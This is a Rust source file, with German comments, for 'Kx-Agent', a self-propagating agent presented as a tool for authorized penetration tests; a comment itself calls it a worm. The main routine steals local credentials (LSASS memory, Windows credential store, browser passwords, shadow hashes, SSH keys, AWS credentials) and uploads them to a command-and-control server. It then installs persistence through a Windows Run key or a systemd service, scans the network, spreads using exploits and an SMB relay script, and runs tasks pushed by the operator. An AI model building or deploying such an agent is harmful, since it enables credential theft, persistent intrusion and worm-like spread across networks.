//! Kx-Agent: Autonomer Propagations-Orchestrator für autorisierte Penetrationstests.
//!
//! Entdeckt Hosts im Netz, scannt offene Ports, versucht Exploits, extrahiert
//! Secrets vom lokalen Host, installiert Persistenz und meldet alles an den
//! C2-Server. Nur für autorisierte Netzwerke gedacht.

mod c2;
mod hostkey;
mod propagate;
mod tasks;

use std::net::Ipv4Addr;
use std::path::PathBuf;

use clap::Parser;

use kx_core::persist::Invocation;

use tracing::{error, info, warn};

/// Bearer-Token, dessen Debug-Ausgabe den Wert maskiert.
///
/// Der Agent gibt seine Argumentstruktur im Debug-Output aus. Ein reiner
/// `String` käme dabei im Klartext in die Konsole und in die Log-Dateien.
/// Der eigene Typ verhindert das strukturell: er lässt sich nur über
/// [`Secret::as_str`] als Text lesen, und seine `Debug`-Ausgabe ist maskiert.
#[derive(Clone)]
struct Secret(String);

impl Secret {
    /// Der Token im Klartext — nur für die Verwendung als Zugangsdaten.
    fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Debug for Secret {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("***")
    }
}

impl std::str::FromStr for Secret {
    type Err = std::convert::Infallible;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Ok(Secret(s.to_string()))
    }
}

impl From<&str> for Secret {
    fn from(s: &str) -> Self {
        Secret(s.to_string())
    }
}

/// Agent-Konfiguration aus CLI/Umgebung.
#[derive(Parser, Debug)]
#[command(name = "kx-agent", about = "Kx-autonomer Agent")]
struct Args {
    /// URL des C2-Servers (https://host:port).
    #[arg(long, env = "KX_C2_URL")]
    server: String,
    /// Bearer-Token für den C2-Server.
    #[arg(long, env = "KX_C2_TOKEN")]
    token: Secret,
    /// Netzwerkschnittstelle für den ARP-Sweep.
    #[arg(long, default_value = "eth0")]
    iface: String,
    /// Start-IP des Scan-Bereichs.
    #[arg(long)]
    start: String,
    /// End-IP des Scan-Bereichs.
    #[arg(long)]
    end: String,
    /// Eigene IP für ARP-Anfragen.
    #[arg(long, default_value = "192.168.1.100")]
    own_ip: String,
    /// Vorkonfigurierte Host-Liste (kommagetrennt) — umgeht ARP.
    #[arg(long)]
    hosts: Option<String>,
    /// Pfad zu smbrelayx.py.
    #[arg(long, default_value = "assets/smbrelayx.py")]
    relay_script: String,
    /// Pfad zum selbstsignierten Server-Zertifikat (PEM).
    #[arg(long)]
    server_cert: String,
    /// Pfad zum oeffentlichen Server-Schluessel (JSON). Damit werden die
    /// Master-Keys der Hosts versiegelt; ohne die Datei geht die Beute
    /// unverschluesselt an den C2.
    #[arg(long)]
    server_key: Option<String>,
}

impl Args {
    /// Die Invocation, mit der der Agent nach der Installation neu startet.
    ///
    /// Die Flag-Liste existiert genau hier. Die Persistenz-Adapter kennen sie
    /// nicht — sie rendern nur diese Form. Ein neues Argument landet damit
    /// automatisch in der systemd-Unit und in der `binPath=`-Zeile von
    /// `sc.exe`, statt in einer zweiten, von Hand gepflegten Liste zu
    /// verschwinden.
    ///
    /// `--server-key` ist Teil der Liste: ohne ihn meldet der neu gestartete
    /// Agent die Beute im Klartext an den C2.
    ///
    /// `--relay-script` ist ebenfalls Teil der Liste: ohne sie fällt der
    /// persistierte Agent auf den relativen Default `assets/smbrelayx.py`
    /// zurück und löst ihn gegen sein Arbeitsverzeichnis auf — nicht gegen
    /// das Verzeichnis des Binaries, in dem das Asset liegt.
    fn persistence_invocation(&self, exe: PathBuf) -> Invocation {
        let mut args = vec![
            "--server".to_string(),
            "${KX_C2_URL}".to_string(),
            "--token".to_string(),
            "${KX_C2_TOKEN}".to_string(),
            "--server-cert".to_string(),
            self.server_cert.clone(),
            "--iface".to_string(),
            self.iface.clone(),
            "--start".to_string(),
            self.start.clone(),
            "--end".to_string(),
            self.end.clone(),
            "--own-ip".to_string(),
            self.own_ip.clone(),
        ];
        // Ohne diese Liste scannt der neu gestartete Agent den ganzen Bereich
        // statt der ursprünglichen Ziele.
        if let Some(hosts) = &self.hosts {
            args.push("--hosts".to_string());
            args.push(hosts.clone());
        }
        if let Some(schluessel) = &self.server_key {
            args.push("--server-key".to_string());
            args.push(schluessel.clone());
        }
        // Der Pfad wird fest eingetragen, damit der persistierte Agent das
        // Asset unabhängig vom Arbeitsverzeichnis findet.
        let relay_script = resolve_relay_script(&self.relay_script, exe.parent());
        args.push("--relay-script".to_string());
        args.push(relay_script.to_string_lossy().to_string());
        Invocation {
            name: "kx-agent".to_string(),
            binary_path: exe,
            args,
            env: vec![
                ("KX_C2_URL".to_string(), self.server.clone()),
                ("KX_C2_TOKEN".to_string(), self.token.as_str().to_string()),
            ],
        }
    }
}

/// Löst den Pfad des Relay-Skripts auf.
///
/// Ein relativer Pfad wird zuerst **neben dem Binary** gesucht — dort liegt
/// das Asset im Betrieb (`<binary-verzeichnis>/assets/smbrelayx.py`). Findet
/// sich dort nichts, bleibt der relative Pfad stehen; er löst sich dann gegen
/// das Arbeitsverzeichnis des Prozesses auf.
///
/// `basis` ist das Verzeichnis, in dem gesucht wird: das Verzeichnis des
/// Binaries, nicht das Arbeitsverzeichnis.
fn resolve_relay_script(script: &str, basis: Option<&std::path::Path>) -> PathBuf {
    let kandidat = PathBuf::from(script);
    if kandidat.is_absolute() {
        return kandidat;
    }
    if let Some(basis) = basis {
        let neben_dem_binary = basis.join(&kandidat);
        if neben_dem_binary.exists() {
            return neben_dem_binary;
        }
    }
    kandidat
}

/// Das Verzeichnis, in dem das Binary liegt.
///
/// `current_exe` löst Symlinks auf — der Pfad zeigt damit auf die Stelle, an
/// der das Binary wirklich liegt, nicht auf einen Symlink im `PATH`.
fn binary_verzeichnis() -> Option<PathBuf> {
    std::env::current_exe()
        .ok()
        .and_then(|exe| exe.parent().map(|dir| dir.to_path_buf()))
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
        )
        .init();

    let args = Args::parse();
    info!("Kx-Agent startete, C2={}", args.server);

    // Die eigene IP ist die Host-Kennung des Agenten. Sie ist stabiler als eine
    // PID und zeigt auf einen Host, den der C2-Server kennt.
    let own_ip: Ipv4Addr = args.own_ip.parse().expect("Ungültige eigene IP");
    let host_id = own_ip.to_string();

    // Der Server-Schluessel decides, ob die Beute verschluesselt gemeldet
    // wird. Fehlt er, laeuft der Agent ohne Schluesselmaterial weiter.
    let sealer = args
        .server_key
        .as_deref()
        .and_then(|pfad| match hostkey::KeySealer::load(pfad) {
            Ok(s) => {
                info!("Server-Schluessel geladen, die Beute wird versiegelt gemeldet");
                Some(s)
            }
            Err(e) => {
                error!("Server-Schluessel unbrauchbar: {e}");
                None
            }
        });

    let client = match c2::C2Client::new(&args.server, args.token.as_str(), &args.server_cert) {
        Ok(c) => c,
        Err(e) => {
            error!("C2-Client-Initialisierung fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };

    // 0. Der Agent registriert sich selbst. Sonst zeigen die lokal erbeuteten
    //    Secrets auf einen Host, den der C2-Server nicht kennt.
    // Der Agent ist selbst ein Host — sein eigener Master-Key wird mit der
    // Selbst-Registrierung gemeldet.
    let eigenes = sealer.as_ref().and_then(|s| s.seal_for_host());
    // Merkt sich, ob der C2-Server den Host kennt. Ohne Selbstregistrierung
    // zeigt die Beute auf einen Host, den der Server nicht kennt — der Lauf
    // hat dann nichts erreicht.
    let mut registrierung_ok = true;
    let self_registration = kx_core::c2::RegisterRequest {
        host_id: host_id.clone(),
        ip: host_id.clone(),
        hostname: None,
        os: None,
        status: Some(kx_core::c2::STATUS_AGENT.to_string()),
        sealed_master: eigenes.as_ref().map(|k| k.sealed_master.clone()),
        // Der Master-Key selbst wird nie gesendet — der Server bekommt nur
        // das versiegelte Material.
        master_key: None,
    };
    if let Err(e) = client.register_host(&self_registration).await {
        error!("Selbst-Registrierung fehlgeschlagen: {e}");
        registrierung_ok = false;
    }

    // 1. Lokale Secrets extrahieren (je nach Plattform).
    let local_secrets = collect_local_secrets(&host_id, eigenes).await;
    let mut hochgeladen = 0usize;
    for s in &local_secrets {
        match client.upload_secret(s).await {
            Ok(()) => hochgeladen += 1,
            Err(e) => error!("Secret-Upload fehlgeschlagen: {e}"),
        }
    }
    info!(
        "{} von {} lokalen Secrets hochgeladen",
        hochgeladen,
        local_secrets.len()
    );

    // 2. Persistenz installieren.
    if let Err(e) = install_persistence(&args).await {
        error!("Persistenz-Installation fehlgeschlagen: {e}");
    } else {
        info!("Persistenz installiert");
    }

    // 3. Netzwerk-Phase: Entdeckung → Scan → Exploit.
    let range_start: Ipv4Addr = args.start.parse().expect("Ungültige Start-IP");
    let range_end: Ipv4Addr = args.end.parse().expect("Ungültige End-IP");

    let discovered = if let Some(hosts) = &args.hosts {
        info!("Nutze vorgegebene Host-Liste");
        hosts
            .split(',')
            .filter_map(|h| h.trim().parse::<Ipv4Addr>().ok())
            .map(|ip| kx_scanner::DiscoveredHost {
                mac: [0; 6],
                ip: ip.into(),
            })
            .collect()
    } else {
        // Die eigene MAC kommt vom Interface: der ARP-Sweep nennt sie als
        // Absender. Eine Anfrage von 00:00:00:00:00:00 beantwortet keine
        // Gegenstelle - sie kennt die Absender-IP schon und wartet auf die
        // MAC, die sie im Cache hat.
        match kx_scanner::read_mac(&args.iface)
            .ok_or_else(|| "MAC des Interfaces nicht lesbar".to_string())
            .and_then(|own_mac| {
                kx_scanner::arp_sweep(&args.iface, &range_start, &range_end, &own_ip, &own_mac)
                    .map_err(|e| e.to_string())
            }) {
            Ok(h) => h,
            Err(grund) => {
                // Ohne ARP (Windows, macOS ohne CAP_NET_RAW) fragt der Agent
                // das Netz nicht ab, sondern klopft den Bereich ab: der
                // TCP-Scan in der Propagation entscheidet, wer antwortet.
                info!("ARP-Sweep nicht verfuegbar ({grund}) — Bereich wird abgeklopft");
                if kx_scanner::bereich_ist_zu_gross(range_start, range_end) {
                    warn!(
                        "Bereich {range_start} bis {range_end} ist zu gross — \
                         nur die ersten {} Adressen werden abgeklopft",
                        kx_scanner::range::MAX_BEREICH
                    );
                }
                kx_scanner::ip_range(range_start, range_end)
                    .into_iter()
                    .map(|ip| kx_scanner::DiscoveredHost {
                        mac: [0; 6],
                        ip: ip.into(),
                    })
                    .collect()
            }
        }
    };

    // Das Asset liegt neben dem Binary; ein relativer Pfad löst sich sonst
    // gegen das Arbeitsverzeichnis des Prozesses auf — unter systemd ist das
    // das Wurzelverzeichnis.
    let relay_script = resolve_relay_script(&args.relay_script, binary_verzeichnis().as_deref());
    let results = propagate::run_propagation(
        &discovered,
        &relay_script.to_string_lossy(),
        sealer.as_ref(),
    )
    .await;

    // 4. Neuentdeckte Hosts an den C2-Server melden.
    for h in &results.new_hosts {
        let _ = client.register_host(h).await;
    }
    // Jedes Secret trägt die Kennung des Hosts, bei dem es erbeutet wurde.
    for s in &results.new_secrets {
        let _ = client.upload_secret(s).await;
    }

    // 5. Offene Tasks ausfuehren. Der Operator hat die Auftraege ueber
    //    `POST /api/tasks/new` angelegt; der Agent holt sie,
    //    fuehrt sie aus und meldet das Ergebnis zurueck.
    match tasks::run_pending_tasks(&client, &host_id).await {
        Ok(count) => info!("{count} Tasks ausgefuehrt"),
        Err(e) => error!("Task-Abholung fehlgeschlagen: {e}"),
    }

    info!(
        "Agent-Lauf abgeschlossen: {} neue Hosts, {} neue Secrets",
        results.new_hosts.len(),
        results.new_secrets.len()
    );

    // Ein Lauf, der nichts erreicht, darf nicht als Erfolg melden. Der
    // systemd-Timer startet den nächsten Lauf ohnehin — aber ein
    // fehlgeschlagener Lauf muss im Journal als Fehlschlag stehen, sonst
    // merkt der Betreiber erst beim Blick ins Dashboard, dass der Wurm
    // längst tot ist.
    if !registrierung_ok {
        error!("Der Lauf hat den C2-Server nicht erreicht — der Agent meldet Fehlschlag");
        std::process::exit(1);
    }
    if !local_secrets.is_empty() && hochgeladen == 0 {
        error!("Kein einziger Secret-Upload geklappt — der Agent meldet Fehlschlag");
        std::process::exit(1);
    }
}

/// Extrahiert Secrets vom lokalen Host (Windows oder POSIX).
///
/// Jedes Secret bekommt die Host-Kennung des Agenten mit — die Kennung des Hosts,
/// bei dem es erbeutet wurde. Das ist hier der Agent selbst.
///
/// Die Extraktoren liefern dieselbe Form (`kx_core::secret::Secret`), deshalb
/// ist der Weg von der Extraktion zum Upload eine Schleife statt vier
/// kopierter Blöcke. Die Quelle des Stücks steht im Secret — sie kommt vom
/// Extraktor, der sie am besten kennt.
async fn collect_local_secrets(
    host_id: &str,
    schluessel: Option<hostkey::SealedHostKey>,
) -> Vec<kx_core::c2::SecretUpload> {
    let mut secrets: Vec<kx_core::secret::Secret> = Vec::new();
    #[cfg(target_os = "windows")]
    {
        secrets.extend(kx_win::extract_lsass().await.unwrap_or_default());
        secrets.extend(
            kx_win::extract_credential_manager()
                .await
                .unwrap_or_default(),
        );
        secrets.extend(
            kx_win::extract_browser_credentials()
                .await
                .unwrap_or_default(),
        );
    }
    #[cfg(unix)]
    {
        secrets.extend(kx_posix::extract_shadow_hashes().await.unwrap_or_default());
        secrets.extend(kx_posix::extract_ssh_keys().await.unwrap_or_default());
        secrets.extend(
            kx_posix::extract_aws_credentials()
                .await
                .unwrap_or_default(),
        );
    }

    // Der Master-Key gehoert zum Host, von dem das Stueck stammt. Ohne ihn
    // geht die Beute im Klartext an den C2 — der dokumentierte Normalfall
    // eines Agenten ohne Server-Schluessel.
    let master_key = schluessel.as_ref().map(|k| k.roh.as_slice());

    secrets
        .into_iter()
        .filter_map(|secret| {
            match kx_core::exfil::ExfiltratedSecret::new(&secret, master_key).upload(host_id) {
                Ok(upload) => Some(upload),
                // Der Klartext geht nicht als Ersatz raus — das Stueck bleibt.
                Err(e) => {
                    error!("Beute nicht versiegelbar, sie bleibt hier: {e}");
                    None
                }
            }
        })
        .collect()
}

/// Installiert Persistenz (Windows oder POSIX).
///
/// Der Agent startet danach mit derselben Invocation neu, mit der er jetzt
/// läuft — die Flag-Liste steht in [`Args::persistence_invocation`] und sonst
/// nirgends. Fehlt ein Pflichtargument, startet der Dienst gar nicht; fehlt
/// `--server-key`, meldet er die Beute im Klartext.
///
/// Unter Unix landen Token und URL in einer Environment-Datei mit 0600 und
/// werden von systemd als `${KX_C2_TOKEN}` in den `ExecStart` eingesetzt. Die
/// Unit-Datei selbst ist für jeden lesbar, der die Datei lesen darf — dort
/// steht kein Geheimnis. Unter Windows gibt es keine Environment-Datei für
/// `sc.exe`; die Werte stehen dort in der Befehlszeile.
async fn install_persistence(args: &Args) -> Result<(), Box<dyn std::error::Error>> {
    let exe = std::env::current_exe()?;
    let invocation = args.persistence_invocation(exe);
    #[cfg(target_os = "windows")]
    {
        // Kein Dienst: der Agent meldet sich beim Start nie beim Service
        // Control Manager, der bricht nach 30 Sekunden mit "FAILED 1053" ab.
        // Der Run-Key startet ihn bei jeder Anmeldung.
        kx_win::install_run_key(&invocation).await?;
    }
    #[cfg(unix)]
    {
        kx_posix::install_systemd_service(&invocation).await?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args_mit_token(token: &str) -> Args {
        Args {
            server: "https://127.0.0.1:8443".to_string(),
            token: Secret::from(token),
            iface: "eth0".to_string(),
            start: "10.0.0.1".to_string(),
            end: "10.0.0.2".to_string(),
            own_ip: "10.0.0.3".to_string(),
            hosts: None,
            relay_script: "assets/smbrelayx.py".to_string(),
            server_cert: "/tmp/server.pem".to_string(),
            server_key: None,
        }
    }

    #[test]
    fn debug_ausgabe_der_argumente_zeigt_kein_token() {
        let args = args_mit_token("hochgeheim-1234");
        let ausgabe = format!("{args:?}");

        assert!(
            !ausgabe.contains("hochgeheim-1234"),
            "die Debug-Ausgabe enthält das Token im Klartext: {ausgabe}"
        );
        assert!(
            ausgabe.contains("***"),
            "die Debug-Ausgabe maskiert das Token nicht: {ausgabe}"
        );
    }

    #[test]
    fn token_bleibt_als_text_lesbar() {
        let args = args_mit_token("hochgeheim-1234");
        assert_eq!(args.token.as_str(), "hochgeheim-1234");
    }

    #[test]
    fn die_persistenz_invocation_traegt_alle_pflichtargumente() {
        let mut args = args_mit_token("geheim");
        args.server_key = Some("/etc/kx/server-pub.json".to_string());
        let inv = args.persistence_invocation(PathBuf::from("/usr/local/bin/kx-agent"));
        let joined = inv.args.join(" ");

        for flag in [
            "--server",
            "--token",
            "--server-cert",
            "--iface",
            "--start",
            "--end",
            "--own-ip",
            "--server-key",
            "--relay-script",
        ] {
            assert!(
                joined.contains(flag),
                "{flag} fehlt in der Invocation: {joined}"
            );
        }
    }

    /// Das Relay-Skript wird neben dem Binary gesucht.
    ///
    /// Das Asset liegt im Betrieb neben dem Binary. Ein relativer Pfad, der
    /// sich gegen das Arbeitsverzeichnis des Prozesses auflöst, findet es
    /// unter systemd nicht — dort ist das Arbeitsverzeichnis `/`.
    #[test]
    fn der_relay_pfad_wird_neben_dem_binary_gesucht() {
        let basis = std::env::temp_dir().join(format!("kx-agent-test-{}", std::process::id()));
        let asset_dir = basis.join("assets");
        std::fs::create_dir_all(&asset_dir).expect("Testverzeichnis");
        std::fs::write(asset_dir.join("smbrelayx.py"), "# leer").expect("Testdatei");

        let gefunden = resolve_relay_script("assets/smbrelayx.py", Some(&basis));
        assert_eq!(
            gefunden,
            asset_dir.join("smbrelayx.py"),
            "das Asset wurde nicht neben dem Binary gefunden"
        );

        std::fs::remove_dir_all(&basis).ok();
    }

    /// Ohne das Asset neben dem Binary bleibt der relative Pfad stehen.
    ///
    /// Der Rückfall ist der bisherige Wert: der Pfad löst sich gegen das
    /// Arbeitsverzeichnis des Prozesses auf.
    #[test]
    fn ohne_asset_neben_dem_binary_bleibt_der_relative_pfad() {
        let basis = std::env::temp_dir().join(format!("kx-agent-leer-{}", std::process::id()));
        std::fs::create_dir_all(&basis).expect("Testverzeichnis");

        let gefunden = resolve_relay_script("assets/smbrelayx.py", Some(&basis));
        assert_eq!(
            gefunden,
            PathBuf::from("assets/smbrelayx.py"),
            "der relative Pfad wurde nicht beibehalten"
        );

        std::fs::remove_dir_all(&basis).ok();
    }

    #[test]
    fn die_persistenz_invocation_verbirgt_kein_geheimnis_in_den_argumenten() {
        let args = args_mit_token("hochgeheim-1234");
        let inv = args.persistence_invocation(PathBuf::from("/usr/local/bin/kx-agent"));
        let joined = inv.args.join(" ");

        assert!(
            !joined.contains("hochgeheim-1234"),
            "das Token steht im Klartext in den Argumenten: {joined}"
        );
        assert!(
            joined.contains("${KX_C2_TOKEN}"),
            "der Platzhalter für das Token fehlt: {joined}"
        );
    }
}
